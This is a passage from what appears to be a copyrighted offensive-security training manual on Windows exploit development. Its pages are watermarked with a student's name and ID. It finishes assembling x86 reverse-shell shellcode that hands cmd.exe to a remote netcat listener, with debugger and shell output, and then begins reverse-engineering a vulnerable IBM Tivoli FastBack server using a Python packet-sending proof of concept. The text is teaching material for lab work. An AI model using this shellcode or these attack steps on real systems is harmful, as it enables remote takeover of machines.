    "   push  eax                       ;"  #   Push dwY 
    "   push  eax                       ;"  #   Push dwX 
    "   push  eax                       ;"  #   Push lpTitle 
    "   push  eax                       ;"  #   Push lpDesktop 
    "   push  eax                       ;"  #   Push lpReserved 
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL 
    "   push  eax                       ;"  #   Push cb 
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA 
structure 
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI 
Listing 354 - reverse_shell_0x05.py: Creating the STARTUPINFOA structure 
First, we introduce the create_startupinfoa function, which is responsible for creating the 
STARTUPINFOA and obtaining a pointer to it for later use. 
Next, we push the ESI register, which currently holds our socket descriptor, to the stack three 
times. This sets the hStdInput, hStdOutput, and hStdError members. 
This instruction is followed by pushing two NULL DWORDS setting the lpReserved2, cbReserved2, 
and wShowWindow members. 
Continuing the logic of our function, we set both the AL and CX registers to 0x80, and then add 
them together, storing the result in EAX. This value is then pushed as the dwFlags member. 
The only other parameter not set to NULL is cb, which is set to the structure size (0x44). 
As a final step in the create_startupinfoa function, we push the ESP register, which gives us a 
pointer to the STARTUPINFOA structure on the stack. We then POP that value into EDI. 
The next step is to store the “cmd.exe” string and obtain a pointer to it. The assembly instructions 
required to do that are shown below: 
    " create_cmd_string:                 "  # 
    "   mov   eax, 0xff9a879b           ;"  #   Move 0xff9a879b into EAX 
    "   neg   eax                       ;"  #   Negate EAX, EAX = 00657865 
    "   push  eax                       ;"  #   Push part of the "cmd.exe" string 
    "   push  0x2e646d63                ;"  #   Push the remainder of the "cmd.exe" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
289 
string 
    "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string 
    "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string 
in EBX 
Listing 355 - Store the “cmd.exe” string and get a pointer to it 
The assembly instructions from Listing 355 start by moving a negative value into EAX. This 
instruction is followed by a NEG263 instruction, which will result in the last part of the string 
including the NULL string terminator. This instruction allows us to avoid the NULL byte in our 
shellcode. 
Finally, we push the rest of the “cmd.exe” string to the stack, and obtain a pointer to it in EBX to 
use later. 
Now that we have the STARTUPINFOA structure and “cmd.exe” string ready, it’s time to set up the 
arguments and call the function: 
    " call_createprocessa:               "  # 
    "   mov   eax, esp                  ;"  #   Move ESP to EAX 
    "   xor   ecx, ecx                  ;"  #   Null ECX 
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX 
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid 
overwriting the structure later 
    "   push  eax                       ;"  #   Push lpProcessInformation 
    "   push  edi                       ;"  #   Push lpStartupInfo 
    "   xor   eax, eax                  ;"  #   Null EAX    
    "   push  eax                       ;"  #   Push lpCurrentDirectory 
    "   push  eax                       ;"  #   Push lpEnvironment 
    "   push  eax                       ;"  #   Push dwCreationFlags 
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE) 
    "   push  eax                       ;"  #   Push bInheritHandles 
    "   dec   eax                       ;"  #   Null EAX 
    "   push  eax                       ;"  #   Push lpThreadAttributes 
    "   push  eax                       ;"  #   Push lpProcessAttributes 
    "   push  ebx                       ;"  #   Push lpCommandLine 
    "   push  eax                       ;"  #   Push lpApplicationName 
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA 
Listing 356 - Calling the CreateProcessA API 
The call_createprocessa function starts by moving the ESP register to EAX and subtracting 0x390 
from it with the help of ECX. This is the same step we took when calling the WSAStartup API, 
which populated the WSADATA structure. This time, we are using this memory address to store 
the PROCESS_INFORMATION structure, which will be populated by the API. 
Next, we push a pointer to the STARTUPINFOA structure that we previously stored in EDI. This 
instruction is followed by three NULL DWORDs, setting the next three arguments. 
We then increase EAX, making the register contain the value 0x01 (TRUE), and push it as the 
bInheritHandles argument. Then we decrease the register, setting it back to NULL, and push two 
NULL DWORDs. 
 
263 (Faydoc - NEG), http://faydoc.tripod.com/cpu/neg.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
290 
The lpCommandLine, which requires a pointer to a string representing the command to be 
executed, is pushed on the stack using the EBX register set in a previous step. Finally, we set the 
lpApplicationName argument to NULL and call the API. 
Let’s run our updated shellcode and verify the return value of CreateProcessA inside WinDbg by 
setting a breakpoint right at the call instruction. 
We’ll be sure to restart our Netcat listener on the Kali machine. Without it, the call to WSAConnect 
will time out. 
0:002> bp 0294016c  
 
0:002> g 
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll 
Breakpoint 0 hit 
eax=00000000 ebx=02b3f304 ecx=00000390 edx=770a4550 esi=00000180 edi=02b3f30c 
eip=0294016c esp=02b3f2dc ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0294016c ff5518          call    dword ptr [ebp+18h]  
ss:0023:02b3f7ac={KERNEL32!CreateProcessAStub (76e68d80)} 
 
0:002> p 
eax=00000001 ebx=02b3f304 ecx=74517fd6 edx=00000000 esi=00000180 edi=02b3f30c 
eip=0294016f esp=02b3f304 ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0294016f 0000            add     byte ptr [eax],al          ds:0023:00000001=?? 
Listing 357 - Calling CreateProcessA inside WinDbg 
According to the output from Listing 357, the return value we got is not NULL. This indicates that 
the call was successful. 
We can confirm that the call was successful by switching to our Kali machine, where we should 
find a fully-working reverse shell. 
kali@kali:~$ sudo nc -lvp 443 
[sudo] password for kali:  
listening on [any] 443 ... 
192.168.119.10: inverse host lookup failed: Unknown host 
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.10] 51438 
Microsoft Windows [Version 10.0.16299.15] 
(c) 2015 Microsoft Corporation. All rights reserved. 
 
C:\Users\offsec\Desktop> 
Listing 358 - Getting a reverse shell on our Kali machine 
Excellent! We have successfully written a reverse shell in Assembly, using the Keystone Python 
library to develop and run it. 
7.6.5.1 Exercises 
1. 
Go over the official documentation of the CreateProcessA API and ensure that you 
understand the arguments required to successfully call it. 
2. 
Make sure you understand the definition of the STARTUPINFOA structure used by the API. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
291 
3. 
Update the shellcode to write the STARTUPINFOA structure to the stack. Using WinDbg, 
verify it is correct. 
4. 
Continue to modify the shellcode and get a pointer to the “cmd.exe” string. 
5. 
Assemble all the pieces and obtain a fully-functional reverse shell on the Kali machine. 
6. 
Comment out the INT3 instruction and run the shellcode without the debugger attached. 
Can you fix the crash that occurs after you receive your shell? 
7. 
Run the final shellcode while having the debugger attached. Inspect the opcodes and verify if 
there are any NULL bytes present, if so attempt to replace the instructions in order to avoid 
them. 
7.6.5.2 Extra Miles 
1. 
Modify the current shellcode and optimize the instructions to reduce as much space as 
possible. How many bytes can you save by using more efficient instructions? Inspect 
instructions such as rep movsb264 when creating structures that require a lot of NULL fields. 
2. 
Update the newly optimized shellcode and print the generated opcodes in a format that you 
can use in an exploit, covered in one of the previous modules. 
3. 
Change your current shellcode from a reverse shell to a bind shell. Go over the Microsoft 
documentation and explore the bind265 API for more information. 
7.7 Wrapping Up 
This module examined the theory and practical steps behind creating custom shellcode for 
universal use on multiple Windows platforms. We explored various prototypes for the functions 
required to achieve a reverse shell, and learned how to invoke them from assembly. We also 
tackled how to create various structures in memory and pass them as arguments when needed. 
Although smaller and simpler shellcode can be achieved by statically calling the required 
functions, finding these function addresses dynamically is the only option in Windows Vista and 
higher due to ASLR. 
It is also worth mentioning that the shellcode covered in this module uses instructions that are 
easy to follow and understand rather than focusing on saving as much space as possible. It is 
possible to reduce the size of the shellcode by using more optimal assembly instructions. 
 
264 (Faydoc - REP MOVSB), http://faydoc.tripod.com/cpu/movsb.htm 
265 (Microsoft - bind), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
292 
 
8 Reverse Engineering for Bugs 
We typically think of exploit development as beginning with a proof of concept and/or a CVE. But 
there’s more to the story - first, the vulnerability must be discovered. In this module, we will cover 
the process behind finding a vulnerability. 
There are two techniques we can use to find vulnerabilities in binary applications: reverse 
engineering and fuzzing.266 
In reverse engineering, we examine a target application’s compiled binary using tools that help 
obtain a higher level of abstraction. This process helps identify potential vulnerabilities in the 
target program code. 
The three main stages of reverse engineering are: 
1. 
Installing the target application and enumerating the possible ways to feed input to it. 
2. 
Reverse engineering the code that parses the input, which usually involves examining the file 
formats or network protocols the application uses. 
3. 
Locating vulnerabilities inside the reverse-engineered code, such as logical vulnerabilities or 
memory corruptions. 
The fundamental principle of fuzzing is to feed the target application with malformed input and 
(hopefully) force it to generate an access violation. 
Each of these two technique has advantages and disadvantages. Reverse engineering can 
guarantee complete coverage of all code sections, but it requires a large time investment. Fuzzing 
tests a large amount of input against highly complex applications - such as web browsers - but it 
is nearly impossible to cover every execution path. 
While these techniques differ in concept, they are often used together by first performing reverse 
engineering and then switching to fuzzing for the remaining portion of the vulnerability discovery 
process. 
In this module, we’ll focus on reverse engineering. Although we won’t cover a comprehensive 
approach, we’ll learn the skills required to understand a program’s behavior. We’ll start by learning 
how to follow a program’s execution with static and dynamic analysis. Next, we’ll leverage this 
experience to discover increasingly complex vulnerabilities that we will exploit in later modules. 
The target for our analysis is an older version of Tivoli Storage Manager FastBack server.267 
8.1 Installation and Enumeration 
Tivoli Storage Manager FastBack server (TSM) is the server component of an old backup product 
solution from IBM. The trial installation version 6.1.4 contains a wide assortment of 
vulnerabilities, providing us with an excellent educational opportunity. 
 
266 (OWASP Foundation, Inc., 2020), https://www.owasp.org/index.php/Fuzzing 
267 (IBM, 2017), 
https://www.ibm.com/support/knowledgecenter/en/SS9NU9_6.1.11/com.ibm.tsm.fb.kc.doc/FB_InstallUse/c_fast_overview.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
293 
Let’s start the reverse engineering process by installing the application and performing 
enumeration. 
8.1.1 Installing Tivoli Storage Manager 
We’ll need to install the trial of TSM on the Windows 10 student VM every time the VM is reverted 
due to inactivity or via the student control panel, so let’s take a moment to get familiar with the 
straightforward installation steps. 
We can find the installer (setup.exe) in the following folder: 
C:\Installers\FastBackServer-6.1.4\X86_TryAndBuy 
Listing 359 - Location of the TSM installer 
We’ll start the installation by double clicking the installer file. Next, we’ll select the Backup Server 
option on the “Installation Type” menu, as shown in Figure 69. 
 
Figure 69: Selecting Backup Server installation type 
Next, let’s accept the trial popup warning to begin the installation process. A popup will appear 
reporting that the “Service FastBack Data Deduplication Service failed to start.” We need to select 
Ignore. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
294 
 
Figure 70: Ignoring service start failure 
Once the software is installed, the required drivers will load and Windows will warn us about the 
missing verification of the driver publisher (Figure 71). We need to select Install this driver 
software anyway to continue the installation. 
 
Figure 71: Driver publisher warning 
Finally, we’ll accept the prompt to reboot the machine. After restarting, the TSM installation is 
complete and we can reconnect to our Windows 10 machine. 
With TSM installed, we can focus on evaluating the attack surface through enumeration. 
8.1.1.1 Exercise 
1. 
Install TSM on your Windows 10 student VM. 
8.1.2 Enumerating an Application 
To lay the groundwork for our reverse engineering, we need to investigate the attack surface and 
learn about what types of vulnerabilities we can find. When attacking a binary application, we 
typically focus on finding unsanitized memory operations and logical bugs that we could leverage 
to obtain remote code execution or local privilege escalation. 
If the target is running as a Windows service, we could also search for insecure service 
permission vulnerabilities. Likewise, targets that load a driver in kernel memory space should be 
investigated for potential kernel vulnerabilities. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
295 
In this module, we will focus on leveraging unsanitized memory operations and logic 
vulnerabilities by sending maliciously-crafted data to a target application’s open network port. 
To achieve this goal, we’ll start by identifying the executable programs running on our system that 
listen for remote connections on a network port. 
We can do this using TCPView268 from SysInternals, which we’ll find on the Windows 10 student 
VM in the C:\Tools\SysinternalsSuite folder. Let’s open it with administrative permissions and 
accept the EULA. 
Next, we need to disable Resolve Addresses under Options (Figure 72) so we can easily identify 
which network ports are not listening on the local loopback interface. 
 
Figure 72: Disabling IP address resolution 
With the option to resolve IP addresses disabled, we can analyze the output from TCPView: 
 
Figure 73: Listening network ports associated with TSM 
We’ll find two different processes - FastBackMount.exe and FastBackServer.exe - which seem to 
be associated with TSM based on their names. 
First, we can observe that FastBackMount.exe is listening on the external IP address on TCP port 
30051, while UDP port 30005 only listens on the local loopback interface. This is useful 
 
268 (Microsoft, 2011), https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
296 
information for obtaining both a remote attack surface for potential remote code execution (RCE), 
and a local attack surface for potential local privilege escalation (LPE), assuming the target is 
running with elevated privileges. 
We can also observe that FastBackServer.exe is listening on TCP ports 1320, 11406, and 11460 
and UDP port 11461 on the external IP address. This provides us with four additional potential 
remote entry points. 
At this point as an attacker, we should investigate what privileges these two target executables 
are running with. This information is vital as it will tell us what level of access we’d obtain on the 
target system, should we find a vulnerability to leverage. We’ll leave this step as an exercise. 
With network enumeration complete, let’s pick a target to begin our reverse engineering process. 
We have to start with a single network port and go through all of them to be thorough. In our case, 
we will start by choosing TCP port 11460 to attack FastBackServer.exe. 
8.1.2.1 Exercises 
1. 
Use TCPView to enumerate listening TCP and UDP network ports. 
2. 
What privileges do the FastBackMount.exe and FastBackServer.exe processes run with? 
3. 
Determine what services are installed and running as part of TSM. 
8.2 Interacting with Tivoli Storage Manager 
In the previous section, we decided to attack the application through TCP port 11460. This port is 
associated with a specific TSM process (FastBackServer.exe), so our next step is to figure out 
how to interact with it and influence its behavior. 
We will trigger different program execution paths by crafting and sending data from our Python 
script to the destination network port. We can use WinDbg to trace and debug FastBackServer 
code. 
While debugging the target code, we’ll align WinDbg with IDA Pro, and use its graphical view to 
better understand the code flow along with any input constraints. 
As you read through the next sections, it is highly recommended that you follow 
along in IDA Pro. 
8.2.1 Hooking the recv API 
To start the process, let’s open WinDbg with administrator permissions and attach it to the 
FastBackServer.exe process. Next, we’ll set a breakpoint on the Win32 recv269 API located in 
Wsock32.dll, as shown in Listing 360. 
 
269 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
297 
0:077> bp wsock32!recv 
 
0:077> g 
Listing 360 - Setting a breakpoint in recv 
Why this breakpoint? When an application receives data from a connected socket, the recv 
function accepts that data from a listening TCP port. If we hook this function and send arbitrary 
data to the TCP port, we can identify the entry point into the application and inspect the code that 
will parse our data. 
With the breakpoint set, we need to write a Python script that connects to the remote application 
on port 11460 and sends data to it. Our first proof of concept (PoC) is shown in Listing 361.  
import socket 
import sys 
 
buf = bytearray([0x41]*100) 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    s.send(buf) 
    s.close() 
 
    print("[+] Packet sent") 
    sys.exit(0) 
 
 
if __name__ == "__main__": 
    main() 
Listing 361 - Initial proof of concept for Tivoli 
Our PoC connects to the remote TCP port and sends 100 “A” (0x41) characters. 
When executed, WinDbg will detect a call to recv issued by the Tivoli application code and break: 
Breakpoint 0 hit 
eax=00000b6c ebx=0604a808 ecx=00df8058 edx=00df8020 esi=0604a808 edi=00669360 
eip=67e71e90 esp=0d85fb58 ebp=0d85fe94 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
WSOCK32!recv: 
67e71e90 8bff            mov     edi,edi 
Listing 362 - Breaking execution when calling recv 
The first step is complete. We hit our breakpoint just after executing our PoC, which suggests that 
it was triggered by the data we sent over TCP. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
298 
We can confirm our hypothesis by examining the arguments for recv. Its function prototype is 
shown in Listing 363. 
int recv( 
  SOCKET s, 
  char   *buf, 
  int    len, 
  int    flags 
); 
Listing 363 - Function prototype for recv 
We’re interested in buf and len. Let’s dump five DWORDs from the stack at the address pointed to 
by ESP: 
0:077> dd esp L5 
0d85fb58  00581ae8 00000b6c 00df8058 00004400 
0d85fb68  00000000 
Listing 364 - Verify recv buf and length 
Based on the output, any data received will be copied into the buffer located at 0x00df8058 with 
the maximum length of 0x4400 bytes. 
Let’s continue the execution to the end of the recv function and examine the execution result 
stored in EAX. 
0:077> pt 
eax=00000064 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=67e71eeb esp=0d85fb58 ebp=0d85fe94 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
WSOCK32!recv+0x5b: 
67e71eeb c21000          ret     10h 
Listing 365 - Verify length of our sent data 
In Listing 365, we find the result to be 0x64. We can translate this to its decimal value of 100, 
which is exactly the length of the data we sent. 
0:077> ? 0x64 
Evaluate expression: 100 = 00000064 
Listing 366 - Convert value of sent data 
Finally, let’s dump the content of the input buffer. 
0:078> dd 00df8058  
00df8058  41414141 41414141 41414141 41414141 
00df8068  41414141 41414141 41414141 41414141 
00df8078  41414141 41414141 41414141 41414141 
00df8088  41414141 41414141 41414141 41414141 
00df8098  41414141 41414141 41414141 41414141 
00df80a8  41414141 41414141 41414141 41414141 
00df80b8  41414141 00000000 00000000 00000000 
00df80c8  00000000 00000000 00000000 00000000 
Listing 367 - Verify our data at buf address 
Great! In the listing above, we can observe our 100 0x41 bytes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
299 
Tracing the application’s steps shows that the data we sent over TCP was received by Tivoli and 
copied into a buffer. Next, we’ll continue our reverse engineering process, identify our entry point 
into the application, and decipher how Tivoli interprets and parses this data. 
8.2.1.1 Exercises 
1. 
Attach WinDbg to FastBackServer.exe and set the breakpoint on recv. 
2. 
Send some data over TCP on port 11460 and verify that it’s received and copied to a buffer. 
8.2.2 Synchronizing WinDbg and IDA Pro 
If we limit ourselves to using WinDbg for analysis, we’re only taking advantage of half of the tools 
at our disposal. We can combine dynamic analysis in WinDbg with static analysis using IDA Pro. 
In this section, we’ll learn how to use these tools to start our reverse engineering process and 
introduce some important concepts we’ll need in this and the next modules. 
This section will cover a lot of assembly code and associated explanations. It is 
imperative that you become familiar with assembly, in particular conditional 
branching. In any area you are lacking, we suggest reviewing the steps presented 
here until you are comfortable. 
Before we can start our analysis with IDA Pro, we first need to determine which PE file to 
examine. The recv function might have been called by the FastBackServer executable itself or a 
DLL loaded into its memory space. We can use WinDbg to understand this by dumping the 
FastBackServer call stack (k): 
0:077> k 
 # ChildEBP RetAddr   
00 0d85fe94 0058164e WSOCK32!recv+0x5b 
01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0x18 
02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd 
03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0 
04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4 
06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24 
07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b 
08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
Listing 368 - Recv callstack in Tivoli 
The highlighted output shows that all the return addresses in the higher part of the call stack 
reside in FastBackServer, therefore we’ll analyze that with IDA Pro. 
Let’s use the List Loaded Modules command (lm) to find the location of the executable on disk. 
The full path is shown in Listing 369. 
0:077> lm m fastbackserver 
Browse full module list 
start    end        module name 
00400000 00c0c000   FastBackServer   (coff symbols)         C:\Program 
Files\Tivoli\TSM\FastBack\server\FastBackServer.exe 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
300 
Listing 369 - Location of executable on disk 
To examine FastBackServer.exe in IDA Pro, we need to copy it to our Kali machine. Once loaded, 
we can synchronize IDA Pro with our debugging session in WinDbg and begin processing it. 
When loading FastBackServer.exe in IDA Pro, we will be prompted for the location of multiple 
imported DLLs. We can cancel out of these prompts as we won’t need these modules for our 
analysis. 
With IDA Pro ready, we return to WinDbg and let our debugging session finish the execution of 
recv, after which we will return into the FastBackServer calling code. When that happens, we can 
find the same location in IDA Pro using the address of the instruction we returned to. 
Let’s 
single-step 
through 
the 
return 
instruction 
to 
arrive 
at 
the 
address 
FastBackServer!FX_AGENT_Receive+0x1e2: 
0:006> p 
eax=00000064 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=00581ae8 esp=0d85fb5c ebp=0d85fe94 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FX_AGENT_Receive+0x1e2: 
00581ae8 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0d6dfe8c=00000001 
Listing 370 - Return address inside FastBackServer 
Next, let’s search in IDA Pro for the FX_AGENT_Receive function through Jump > Jump to 
function…. We can right-click any function name to enter a Quick filter with the name of the 
function we are searching for, as shown in Figure 74. 
 
Figure 74: Searching for FX_AGENT_Receive 
After double-clicking the function name, we’ll land at the function’s entry point. To reach the same 
position in the code we are at in the WinDbg session, we need to scroll down to the call to recv at 
address 0x0581AE3 in IDA Pro, as shown in Figure 75. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
301 
 
Figure 75: Aligning WinDbg and IDA Pro 
We have now synchronized IDA Pro and WinDbg to point at the same memory location. We will 
use IDA Pro’s graph layout to understand the code flow, and WinDbg to view the actual register 
and memory content. 
To perform reverse engineering, we must examine each basic block to 
understand how the assembly instructions work. Becoming proficient with 
assembly will speed up this process. 
8.2.2.1 Exercises 
1. 
Repeat the analysis to locate the FastBackServer executable. 
2. 
Analyze the executable in IDA Pro and synchronize the static and dynamic analysis sessions. 
8.2.3 Tracing the Input 
With WinDbg and IDA Pro aligned, we can begin analyzing the code flow and tracing our input. In 
the following sections, we will read a lot of assembly code and try to translate it to equivalent C-
style pseudocode, for better understanding. 
Let’s begin by examining how the application code uses our input. Our input is initially used in the 
very first instruction after returning from the call into recv. 
The number of bytes received, which is stored in EAX, is saved to the stack through the “mov 
[ebp+var_8], EAX” instruction, and then compared to 0xFFFFFFFF, as displayed in the upper basic 
block of Figure 76. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
302 
 
Figure 76: First usage of our input data 
This basic block makes sure that the call to recv was successful by comparing the function result 
to SOCKET_ERROR, which has a numerical value of “-1” or 0xFFFFFFFF.270 After the comparison, 
we find a conditional jump. This is how an if271 statement in C is usually compiled into assembly. 
Understanding mappings between higher-level languages like C or C++ and 
assembly can make it easier to follow the code flow and gain insight into the 
values we are sending to the application. 
At this point, to predict the execution path, we need to understand what happens during a CMP 
instruction. The CMP instruction subtracts the second operand from the first. If the result is 0, the 
Zero Flag (ZF)272 is set to “1”. Otherwise, the flag is unset. 
The conditional jump following the comparison is Jump Not Zero (JNZ),273 which will execute the 
jump if the ZF is not set. In our case, EAX contains the value 0x64 (number of bytes read by recv), 
not 0xFFFFFFFF, so the Zero Flag will not be set, and the conditional jump is taken. 
Let’s verify our prediction by executing the instructions in WinDbg as shown in Listing 371: 
eax=00000064 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=00581aeb esp=0d85fb6c ebp=0d85fe94 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FX_AGENT_Receive+0x1e5: 
00581aeb 837df8ff        cmp     dword ptr [ebp-8],0FFFFFFFFh 
ss:0023:0d85fe8c=00000064 
 
0:078> p 
 
270 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winsock/handling-winsock-errors 
271 (TutorialsPoint, 2020), https://www.tutorialspoint.com/cplusplus/cpp_if_statement.htm 
272 (Aldeid, 2015), https://www.aldeid.com/wiki/X86-assembly/Registers#ZF_.28Zero_Flag.29 
273 (Intel Pentium Instruction Set Reference (Basic Architecture Overview)), http://faydoc.tripod.com/cpu/jnz.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
303 
eax=00000064 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=00581aef esp=0d85fb6c ebp=0d85fe94 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
FastBackServer!FX_AGENT_Receive+0x1e9: 
00581aef 7525            jne     FastBackServer!FX_AGENT_Receive+0x210 (00581b16) 
[br=1] 
 
0:078> r zf 
zf=0 
 
0:078> p 
eax=00000064 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=00581b16 esp=0d85fb6c ebp=0d85fe94 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
FastBackServer!FX_AGENT_Receive+0x210: 
00581b16 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d85fe8c=00000064 
Listing 371 - Execution of CMP and JNZ 
The highlighted instruction in Listing 371 ends with “[br=1]”. This suffix indicates the branch result 
before the instruction is executed.274 The “1” indicates that the jump will be taken (“0” would 
indicate the opposite condition). We also find the Zero Flag to be 0, as expected. 
We can move on to the next code section by single-stepping through the code. 
In the next basic block, we’ll observe another comparison followed by a JNZ instruction. This 
time, EAX is compared to 0. Zero would mean that the recv call succeeded but no data was 
received. Once again, EAX is equal to 0x64 and the Zero Flag is not set, so the jump is taken. 
Listing 372 shows how these two basic blocks would appear in C source code: 
char* buf[0x4400]; 
DWORD result = recv(s,buf,0x4400,0) 
if(result != SOCKET_ERROR) 
{ 
  if(result != 0) 
  { 
    // Do something 
  } 
} 
Listing 372 - C Pseudocode for error handling 
At this point, we can assume that the relevant error handling for the call to recv is complete. 
In this section, we explored how to combine WinDbg and IDA Pro to perform our reverse 
engineering analysis. We also learned more about how assembly instructions work in conditional 
branches. 
In the next section, we’ll continue the analysis and determine what checks are performed on our 
input. 
 
274 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Branch_(computer_science) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
304 
8.2.3.1 Exercise 
1. 
Repeat the analysis performed in this section and ensure you understand how the 
conditional branching works. 
8.2.4 Checksum, Please 
In this section, we’ll go deep into the rabbit hole and begin to trace our input data in the target 
application memory. We will cover each relevant Tivoli code section and gather information about 
how our data sent over TCP is parsed and verified. 
We can start by following the JNZ from the previous section to reach the basic block displayed in 
Figure 77. 
 
Figure 77: Basic block calling PERFMON_S_UpdateCounter 
In this basic block there is a call to the PERFMON_S_UpdateCounter function. Whether this is a 
relevant call to trace or not can be difficult to answer. 
It’s important to keep in mind, when reverse engineering, that not every code path 
or “rabbit hole” needs to be followed. It’s easy to become overwhelmed by 
options and lose track of our goals if we don’t focus on relevant blocks. 
We can try to determine if a call is relevant by placing a hardware breakpoint on the buffer we are 
tracing, and then stepping over the call. If the breakpoint is not triggered, we can interpret it as 
irrelevant and continue. If it is triggered, we must resend our payload and step into the call. 
Let’s try this using a hardware breakpoint triggered by read access on our input buffer. We’ll recall 
from previous sections that our input buffer is stored at 0x00df8058, as a result of the recv call 
(Listing 373): 
eax=00000320 ebx=0604a808 ecx=621f146d edx=77031670 esi=0604a808 edi=00669360 
eip=00581b50 esp=0d85fb64 ebp=0d85fe94 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_Receive+0x24a: 
00581b50 e826d4f0ff      call    FastBackServer!PERFMON_S_UpdateCounter (0048ef7b) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
